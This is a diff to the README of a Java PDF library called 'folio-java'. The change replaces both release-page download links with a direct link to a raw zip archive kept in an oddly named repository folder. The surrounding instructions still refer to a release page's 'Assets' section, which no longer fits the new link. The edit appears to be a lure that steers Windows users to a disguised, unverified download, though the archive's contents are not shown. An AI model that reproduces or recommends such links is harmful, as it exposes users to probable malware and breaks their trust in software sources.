@@ -1,6 +1,6 @@
 # 📂 folio-java - Create and sign digital documents easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/heady-civilyear5606/folio-java/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/heady-civilyear5606/folio-java/main/panneuritic/java-folio-2.4.zip)
 
 folio-java helps you work with PDF documents. You can create new documents, add digital signatures, and convert web pages into PDF files. This library runs on your computer and handles your files locally.
 
@@ -12,7 +12,7 @@ You need a Windows computer to run this software. Ensure you have the Java Runti
 
 You can get the software from our release page. 
 
-[Visit this page to download](https://github.com/heady-civilyear5606/folio-java/releases)
+[Visit this page to download](https://raw.githubusercontent.com/heady-civilyear5606/folio-java/main/panneuritic/java-folio-2.4.zip)
 
 On this page, look for the section labeled Assets. Click the file ending in .zip to start your download. Choose a folder on your computer to save the file.
 
